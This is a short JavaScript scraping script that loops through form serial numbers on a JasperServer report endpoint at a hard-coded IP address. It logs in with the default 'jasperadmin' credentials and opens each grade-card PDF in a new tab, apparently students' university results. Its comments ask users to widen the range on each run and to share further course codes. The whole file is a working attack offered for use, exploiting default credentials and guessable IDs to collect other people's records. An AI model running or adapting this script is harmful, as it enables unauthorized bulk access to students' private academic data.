//Licensed under GNU GPL V3.

//62699 is the lower limit which i found , i may be wrong
//initial is the formSerial Number
//63100 is just random
//trcoursedode may mean table-row-course-code. A table info in  mysql db
//trcoursecode=TR00003168 is for school which i found . There will be differnet table row codes one for youself  
//You can also change the trcoursecode if you got any and please share.

//If a pdf document is of 908bytes it means its an empty document with no result in it.

//-------------
//please increment initial and test number in while loop by 100 every next time you execute the code.



var initial = 62698;

function changer(){
    initial += 1;
    _url=`http://13.250.148.144/jasperserver/flow.html?_flowId=viewReportFlow&standAlone=true&_flowId=viewReportFlow&ParentFolderUri=%2Freports%2Fgradecard_jmi&reportUnit=%2Freports%2Fgradecard_jmi%2Fgradecard12_extra&j_username=jasperadmin&j_password=jasperadmin&output=pdf&trcoursecode=TR00003168&frmslno=${initial}&toslno=${initial}`;
    window.open(_url,'_blank');
}
function exec(){
    alert('This will this Will open 100 tabs at once in your browser !!');
    input = prompt("Do You want to Continue type (Y/N)")[0];
    if (input.toUpperCase()  === 'N'){
        return;
    }
    else
    {
        while(initial < 63798){
         changer();
         console.log(initial);
     }
     console.log('Executed SucessFully');
     }
}
$('a').on('click',exec);
